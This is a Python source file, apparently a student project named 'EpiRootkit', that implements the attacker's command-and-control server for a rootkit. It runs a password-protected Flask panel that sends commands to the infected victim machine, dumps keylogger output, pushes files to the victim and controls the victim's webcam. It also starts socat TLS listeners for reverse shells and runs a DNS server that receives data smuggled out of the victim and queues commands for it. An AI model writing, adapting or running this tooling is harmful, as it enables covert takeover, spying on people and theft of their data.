import socket
import threading
import subprocess
import shutil
import time
import getpass
import sys
import os
import time
import binascii, socketserver
from flask import Flask, request, render_template, redirect, url_for, flash, send_file
from werkzeug.utils import secure_filename
from prompt_toolkit import PromptSession
from prompt_toolkit.patch_stdout import patch_stdout
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
from dnslib import DNSRecord, QTYPE, RR, A, TXT, EDNS0

# -------------------- CONFIGURATION --------------------
HOST = '0.0.0.0'
PORT = 4242
BUFFER_SIZE = 1024
PASSWORD = "epiroot"
UPLOAD_FOLDER = "uploads"
DOWNLOAD_FOLDER = "downloads"

AES_KEY = b'1234567890abcdef'  # 16 bytes = 128 bits
AES_IV = b'abcdef1234567890'   # 16 bytes = 128 bits

# ------------------------ DNS --------------------------
DNS_PORT = 53
DNS_DOMAIN = "dns.google.com"
DNS_RESPONSE_TIMEOUT = 12.0
DNS_POLL_INTERVAL   = 0.2 
command_queue = []
exfil_buffer = {}
last_channel = 'tcp'
expected_chunks = None

# -------------------- FLASK SETUP ---------------------- #
app = Flask(__name__)
app.secret_key = "epirootkit_secret"
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(DOWNLOAD_FOLDER, exist_ok=True)

rootkit_connection = None
rootkit_address = None
last_response = ""
authenticated = False
connection_lock = threading.Lock()

# Structure pour garder une trace des commandes et de leurs sorties
command_history = []

@app.route('/')
def login():
    global authenticated
    if authenticated:
        return redirect(url_for('dashboard'))
    return render_template("login.html")

# ---------------------------------------- WEB AUTH ---------------------------------------- #

@app.route('/auth', methods=['POST'])
def auth():
    global authenticated
    if request.form.get('password') == PASSWORD:
        authenticated = True
        return redirect(url_for('dashboard'))
    flash("❌ Mot de passe incorrect.")
    return redirect(url_for('login'))

# ---------------------------------------- DASHBOARD ---------------------------------------- #

@app.route('/dashboard')
def dashboard():
    if not authenticated:
        return redirect(url_for('login'))
    status = "✅ Connecté" if rootkit_connection else "🔴 Déconnecté"
    return render_template("dashboard.html", status=status, rootkit_address=rootkit_address)

# ---------------------------------------- TERMINAL ---------------------------------------- #

@app.route('/terminal')
def terminal():
    if not authenticated:
        return redirect(url_for('login'))
    return render_template("terminal.html", response=last_response, history=command_history, last_channel=last_channel)

# ---------------------------------------- REMOTE SHELL ---------------------------------------- #

@app.route('/shell_remote', methods=['GET', 'POST'])
def shell_remote():
    if not authenticated:
        return redirect(url_for('login'))

    shell_output = ""
    if request.method == 'POST':
        port = request.form.get('port')

        try:
            # Vérifier si le port est valide
            port = int(port)
            if port < 1024 or port > 65535:
                shell_output = "❌ Le port doit être entre 1024 et 65535."
            else:
                threading.Thread(target=run_socat_shell, args=(port,)).start()
                time.sleep(1)
                # Envoyer la commande au rootkit pour démarrer le shell distant sur le port choisi
                with connection_lock:
                    if rootkit_connection:
                        rootkit_connection.sendall(f"getshell {port}\n".encode())
                        shell_output = f"🚀 Shell distant lancé sur le port {port}."
                    else:
                        shell_output = "❌ Rootkit non connecté."

        except ValueError:
            shell_output = "❌ Le port doit être un nombre valide."

    return render_template("shell_remote.html", shell_output=shell_output)

# ---------------------------------------- KEYLOGGER ---------------------------------------- #

@app.route('/keylogger')
def keylogger():
    if not authenticated:
        return redirect(url_for('login'))
    try:
        with connection_lock:
            if rootkit_connection:
                rootkit_connection.sendall(b"keylog_dump\n")
                rootkit_connection.settimeout(2)
                data = rootkit_connection.recv(BUFFER_SIZE).decode()
                rootkit_connection.settimeout(None)
                keylog_data = data.strip()
            else:
                keylog_data = "Aucune connexion au rootkit."
    except Exception as e:
        keylog_data = f"Erreur : {e}"
    return render_template("keylogger.html", keylog_data=keylog_data)

@app.route('/history')
def history():
    if not authenticated:
        return redirect(url_for('login'))
    return render_template("history.html", history=command_history)

# ---------------------------------------- UPLOAD ---------------------------------------- #

@app.route('/upload', methods=['GET', 'POST'])
def upload():
    if not authenticated:
        return redirect(url_for('login'))

    if request.method == 'POST':
        uploaded_file = request.files.get('file')
        remote_path = request.form.get('remote_path')

        if uploaded_file and remote_path:
            filename = secure_filename(uploaded_file.filename)
            local_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
            uploaded_file.save(local_path)

            try:
                upload_file_encrypted(local_path, remote_path)
                flash(f"✅ Fichier '{filename}' uploadé et transmis à la victime.")
            except Exception as e:
                flash(f"❌ Erreur lors du transfert à la victime : {e}")

    return render_template("upload.html")


def upload_file_encrypted(local_path, remote_path):
    if not os.path.exists(local_path):
        print(f"[!] Le fichier local '{local_path}' n'existe pas.")
        return

    try:
        # Envoi de la commande upload + chemin destination
        send_to_server(rootkit_connection, f"upload {remote_path}")

        # Envoi du fichier chiffré par blocs
        with open(local_path, "rb") as f:
            while True:
                chunk = f.read(4096)
                if not chunk:
                    break
                encrypted = aes_encrypt(chunk)
                rootkit_connection.sendall(encrypted)

        # Marqueur de fin
        rootkit_connection.sendall(b"EOF\n")

        print(f"[+] Fichier '{local_path}' envoyé avec succès vers '{remote_path}'.")

    except Exception as e:
        print(f"[!] Erreur d'envoi : {e}")

# ---------------------------------------- DOWNLOAD ---------------------------------------- #

@app.route('/download')
def download():
    if not authenticated:
        return redirect(url_for('login'))
    files = os.listdir(DOWNLOAD_FOLDER)
    return render_template("download.html", files=files)

@app.route('/download/<filename>')
def download_file(filename):
    if not authenticated:
        return redirect(url_for('login'))
    return send_file(os.path.join(DOWNLOAD_FOLDER, filename), as_attachment=True)

def assemble_exfil(timeout=DNS_RESPONSE_TIMEOUT, poll=DNS_POLL_INTERVAL):
    """
    Wait up to `timeout` seconds for all expected_chunks to arrive,
    polling exfil_buffer every `poll` seconds. Returns the assembled
    text (or empty string on timeout).
    """
    global expected_chunks, exfil_buffer

    start = time.time()
    
    # Wait until we know how many chunks AND have them all, or timeout
    while True:
        if expected_chunks is not None and len(exfil_buffer) >= expected_chunks:
            break
        if time.time() - start > timeout:
            break
        time.sleep(poll)

    if expected_chunks is not None and len(exfil_buffer) >= expected_chunks:
        data = b''.join(exfil_buffer[i] for i in range(expected_chunks))
        text = data.decode(errors='ignore')
    else:
        text = ""

    # Reset the buffer and expected chunks, for next command
    expected_chunks = None
    exfil_buffer.clear()
    return text

# ---------------------------------------- SEND COMMAND ---------------------------------------- #

@app.route('/send', methods=['POST'])
def send():
    global last_channel
    global last_response
    if not authenticated:
        return redirect(url_for('login'))

    channel = request.form.get('channel','tcp')
    last_channel = channel 
    cmd = request.form.get('command', '').strip()
    if not cmd:
        return redirect(url_for('terminal'))

    # Ajout de la commande dans l'historique
    command_entry = {"command": cmd, "stdout": "", "stderr": ""}
    command_history.append(command_entry)

    if channel == 'dns':
        command_queue.append(cmd)
        last_response = {"stdout": "", "stderr": "⏳ Queued via DNS"}

        out = assemble_exfil()

        if out:
            last_response = {"stdout": out, "stderr": ""}
            command_entry["stdout"] = out
        else:
            last_response = {"stdout": "", "stderr": "⚠️ no DNS response"}
            command_entry["stderr"] = last_response["stderr"]

    else:
        try:
            with connection_lock:
                send_to_server(rootkit_connection, cmd)
                if 'killcom' in cmd.lower():
                    rootkit_connection.close()
                    last_response = {"stdout": "", "stderr": "Connexion terminée."}
                    return redirect(url_for('dashboard'))

                rootkit_connection.settimeout(3)
                try:
                    chunks = []
                    rootkit_connection.settimeout(1)
                    while True:
                        try:
                            part = receive_from_server(rootkit_connection)
                            print(part)
                            if not part:
                                break
                            chunks.append(part)
                        except socket.timeout:
                            break
                    response = ''.join(chunks)

                    stdout_marker = "stdout:"
                    stderr_marker = "stderr:"

                    if stdout_marker in response and stderr_marker in response:
                        start_stdout = response.index(stdout_marker) + len(stdout_marker)
                        start_stderr = response.index(stderr_marker) + len(stderr_marker)

                        stdout_content = response[start_stdout:response.index(stderr_marker)].strip()
                        stderr_content = response[start_stderr:].strip()

                        last_response = {
                            "stdout": stdout_content, 
                            "stderr": stderr_content
                        }

                        # Enregistrer la sortie dans l'historique
                        command_entry["stdout"] = stdout_content
                        command_entry["stderr"] = stderr_content

                    else:
                        last_response = {"stdout": response.strip(), "stderr": ""}
                        command_entry["stdout"] = response.strip()
                        command_entry["stderr"] = ""

                except socket.timeout:
                    last_response = {"stdout": "", "stderr": "⏱️ Le rootkit n'a pas répondu à temps."}
                finally:
                    rootkit_connection.settimeout(None)

        except Exception as e:
            last_response = {"stdout": "", "stderr": f"💥 Erreur : {e}"}

    return redirect(url_for('terminal'))

# ---------------------------------------- WEBCAM ---------------------------------------- #

@app.route('/webcam', methods=['GET', 'POST'])
def webcam():
    if not authenticated:
        return redirect(url_for('login'))

    webcam_output = ""
    image_path = "/var/www/html/images/capture.jpg"  # Le chemin où l'image est stockée

    if request.method == 'POST':
        action = request.form.get('action')

        try:
            with connection_lock:
                if rootkit_connection:
                    if action == 'start':
                        rootkit_connection.sendall(b"start_webcam\n")
                        webcam_output = "✅ Webcam démarrée."
                    elif action == 'capture':
                        rootkit_connection.sendall(b"capture_image\n")
                        webcam_output = "📸 Image capturée avec succès."
                    elif action == 'stop':
                        rootkit_connection.sendall(b"stop_webcam\n")
                        webcam_output = "🛑 Webcam arrêtée."
                    else:
                        webcam_output = "❌ Action inconnue."
        except Exception as e:
            webcam_output = f"💥 Erreur : {e}"

    # Vérification si l'image existe
    image_exists = os.path.exists(image_path)

    return render_template("webcam.html", webcam_output=webcam_output, image_exists=image_exists, image_path=image_path)

# ---------------- AES-128 Encryption/Decryption with PKCS#7 padding ----------------
def aes_encrypt(plaintext):
    # Convert string to bytes if needed
    if isinstance(plaintext, str):
        data = plaintext.encode('utf-8')
    else:
        data = plaintext
    
    # Apply PKCS#7 padding
    padder = padding.PKCS7(algorithms.AES.block_size).padder()
    padded_data = padder.update(data) + padder.finalize()
    
    # Encrypt the padded data
    cipher = Cipher(algorithms.AES(AES_KEY), modes.CBC(AES_IV), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted = encryptor.update(padded_data) + encryptor.finalize()
    return encrypted


def aes_decrypt(ciphertext):
    # Decrypt the data
    cipher = Cipher(algorithms.AES(AES_KEY), modes.CBC(AES_IV), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_padded = decryptor.update(ciphertext) + decryptor.finalize()
    
    # Remove PKCS#7 padding
    unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
    unpadded = unpadder.update(decrypted_padded) + unpadder.finalize()
    
    # Convert to string
    result = unpadded.decode('utf-8', errors='ignore')
    
    return result

# ---------------------- SOCKET COMMUNICATION ----------------------
def send_to_server(sock, data):
    # Encrypt the data
    data = aes_encrypt(data)

    # Define the maximum chunk size
    max_chunk_body_size = BUFFER_SIZE - 5
    len_data = len(data)

    # Calculate the number of chunks needed
    nb_chunks_needed = len_data // max_chunk_body_size
    if len_data % max_chunk_body_size != 0:
        nb_chunks_needed += 1

    for i in range(nb_chunks_needed):
        # Calculate the actual size of the chunk
        current_chunk_size = max_chunk_body_size if i < nb_chunks_needed - 1 else len_data % max_chunk_body_size
        if current_chunk_size == 0:
            current_chunk_size = max_chunk_body_size  # Last chunk of maximum size

        # Build the chunk
        chunk = bytearray(BUFFER_SIZE)
        chunk[0] = nb_chunks_needed  # Number of chunks
        chunk[1] = i  # Index of the current chunk
        chunk[2] = (current_chunk_size >> 8) & 0xFF  # Upper byte of the chunk size
        chunk[3] = current_chunk_size & 0xFF  # Lower byte of the chunk size
        chunk[4:4 + current_chunk_size] = data[i * max_chunk_body_size: (i + 1) * max_chunk_body_size]  # Chunk data
        chunk[4 + current_chunk_size] = 0x04  # End-of-transmission byte

        # Send the chunk
        try:
            sock.sendall(chunk)
        except socket.error as e:
            print(f"send_to_server: failed to send message (chunk {i}): {e}")
            return False

    return True

def receive_from_server(sock):
    total_received = 0
    nb_chunks_needed = 0
    received_chunks = []
    buffer = bytearray()

    while True:
        # Receive a chunk
        chunk = sock.recv(BUFFER_SIZE)
        if not chunk:
            print("receive_from_server: failed to receive data or connection closed")
            return False

        # Extract chunk information
        total_chunks = chunk[0]
        chunk_index = chunk[1]
        chunk_data_len = (chunk[2] << 8) | chunk[3]
        chunk_data = chunk[4:4 + chunk_data_len]

        # Check end-of-transmission
        if chunk[4 + chunk_data_len] != 0x04:
            print(f"receive_from_server: invalid end of transmission (chunk {chunk_index})")
            return False

        # Initialize structure if this is the first reception
        if nb_chunks_needed == 0:
            nb_chunks_needed = total_chunks
            received_chunks = [False] * nb_chunks_needed

        # Check for duplicates
        if received_chunks[chunk_index]:
            print(f"receive_from_server: duplicate chunk received (chunk {chunk_index})")
            return False

        # Mark this chunk as received
        received_chunks[chunk_index] = True

        # Append data to the buffer
        buffer.extend(chunk_data)
        total_received += chunk_data_len

        # Check if all chunks have been received
        if all(received_chunks):
            print(f"receive_from_server: all chunks received")
            break


    result = bytes(buffer)

    # Decrypt the data
    decrypted = aes_decrypt(result)

    return decrypted

# ----------------------- DNS THREAD ------------------------
class DNSHandler(socketserver.BaseRequestHandler):
    def handle(self):
        data, sock = self.request
        global expected_chunks, exfil_buffer
        try:
            req   = DNSRecord.parse(data)
            qname = str(req.q.qname).rstrip('.')
            qtype = QTYPE[req.q.qtype]
        except Exception as e:
            print(f"❌ [dns] parse error: {e}")
            return
        reply = req.reply()
       
        # Victim pulling commands via TXT
        if qtype == "TXT" and qname == f"command.{DNS_DOMAIN}":
            if command_queue:
                cmd = command_queue.pop(0)
                print(f"📤 [dns-cmd] sending: {cmd!r}")
                reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT(cmd), ttl=0))
            try:
                sock.sendto(reply.pack(), self.client_address)
            except Exception as e:
                print(f"❌ [dns] failed to send TXT reply: {e}")
            return

        # Victim exfiltrating via A-queries
        if qtype == "A":
            label = qname.split('.', 1)[0]
            if '-' in label and '/' in label:
                hdr, hx = label.split('-', 1)
                seq_s, tot_s = hdr.split('/', 1)
                try:
                    seq = int(seq_s, 16)
                    tot = int(tot_s, 16)
                    chunk = binascii.unhexlify(hx)
                    exfil_buffer[seq] = chunk

                    # On the first chunk, remember how many we expect
                    if expected_chunks is None:
                        expected_chunks = tot
                    print(f"📥 [dns-exfil] got chunk {seq}/{tot}")
                except Exception as e:
                    print(f"⚠️ parse error on label {label}: {e}")

            # Reply harmlessly so the kernel unblocks
            reply.add_answer(RR(qname, QTYPE.A, rdata=A("127.0.0.1"), ttl=0))
            sock.sendto(reply.pack(), self.client_address)


def start_dns_server():
    server = socketserver.ThreadingUDPServer(('0.0.0.0', DNS_PORT), DNSHandler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    print(f"🚧 DNS server listening on UDP/53 for domain {DNS_DOMAIN}")

# ---------------------- SOCKET THREAD ----------------------
def socket_listener():
    global rootkit_connection, rootkit_address
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((HOST, PORT))
    server_socket.listen(1)
    print(f"📡 [*] Serveur à l'écoute sur {HOST}:{PORT}...")
    connection, address = server_socket.accept()

    with connection_lock:
        rootkit_connection = connection
        rootkit_address = address

    print(f"✅ [+] Rootkit connecté depuis {address[0]}")

    data = receive_from_server(connection)
    print(f"📥 [rootkit] {data}")

# ---------------------- CLI MODE ----------------------
def run_socat_shell(port=9001):
    terminal_cmd = None

    if shutil.which("gnome-terminal"):
        terminal_cmd = [
            "gnome-terminal",
            "--",
            "bash",
            "-c",
            f"socat openssl-listen:{port},reuseaddr,cert=$(pwd)/server.pem,verify=0 file:`tty`,raw,echo=0; exec bash"
        ]
    elif shutil.which("xterm"):
        terminal_cmd = [
            "xterm",
            "-e",
            f"bash -c 'socat openssl-listen:{port},reuseaddr,cert=$(pwd)/server.pem,verify=0 file:`tty`,raw,echo=0; exec bash'"
        ]
    elif shutil.which("konsole"):
        terminal_cmd = [
            "konsole",
            "-e",
            "bash",
            "-c",
            f"socat openssl-listen:{port},reuseaddr,cert=$(pwd)/server.pem,verify=0 file:`tty`,raw,echo=0; exec bash"
        ]
    else:
        print("❌ Aucun terminal compatible trouvé.")
        return

    try:
        subprocess.Popen(terminal_cmd)
        print(f"🚀 Terminal distant lancé sur le port {port}.")
    except Exception as e:
        print(f"💥 Erreur socat : {e}")

def run_cli():
    print("🔐 Authentification requise pour le mode CLI")
    pwd = getpass.getpass("Mot de passe > ")
    if pwd != PASSWORD:
        print("❌ Mot de passe incorrect.")
        return

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((HOST, PORT))
    server_socket.listen(1)
    print(f"📡 [*] En attente de connexion sur {HOST}:{PORT}...")
    connection, addr = server_socket.accept()
    print(f"✅ [+] Rootkit connecté depuis {addr[0]}")

    def send_commands():
        session = PromptSession("🧠 Vous > ")
        with patch_stdout():
            while True:
                try:
                    line = session.prompt().strip()
                    if not line:
                        continue
                    if line.lower() == "getshell":
                        threading.Thread(target=run_socat_shell).start()
                        time.sleep(1)
                    command_history.append(line)
                    send_to_server(connection, line)
                    if line.lower() == "killcom":
                        print("❌ Fermeture demandée.")
                        return
                except (KeyboardInterrupt, EOFError):
                    print("\n⚠️ Interruption utilisateur.")
                    break
                except Exception as e:
                    print(f"💥 Erreur : {e}")
                    break

    def receive_responses():
        while True:
            received = receive_from_server(connection);
            print(f"🔒 [*] Received: {received}")

    threading.Thread(target=receive_responses, daemon=True).start()
    send_commands()
    connection.close()
    server_socket.close()
    print("🔒 Connexion fermée.")


# ---------------------- MAIN MENU ----------------------
def main():
    print("""
=== 🎛️ EpiRootkit Attacking Program ===
1. 🖥️ Mode CLI
2. 🌐 Mode Web
3. 🧪 Mode Application (à venir)
""")
    ####################################################################
    # CLI is BAD, need to correct and to adapt with DNS and all commands
    ####################################################################
    choix = input("Choix du mode (1/2/3) > ").strip()
    if choix == '1':
        run_cli()
    elif choix == '2':
        start_dns_server()
        threading.Thread(target=socket_listener, daemon=True).start()
        app.run(host='0.0.0.0', port=5000)
    elif choix == '3':
        print("🔧 Mode application pas encore implémenté.")
    else:
        print("❌ Choix invalide.")

if __name__ == '__main__':
    main()
